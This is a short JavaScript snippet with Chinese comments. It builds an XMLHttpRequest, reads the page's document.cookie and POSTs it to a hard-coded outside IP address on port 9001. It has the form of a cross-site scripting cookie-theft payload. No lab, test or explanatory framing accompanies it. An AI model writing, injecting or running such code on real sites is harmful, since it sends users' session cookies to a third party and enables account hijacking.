// 创建 XMLHttpRequest 对象
var xhr = new XMLHttpRequest();

// 设置请求方法和目标 URL
xhr.open('POST', 'http://121.91.173.139:9001');

// 设置请求头，包括 Cookie
xhr.setRequestHeader('Cookie', document.cookie);

// 发送请求
xhr.send();
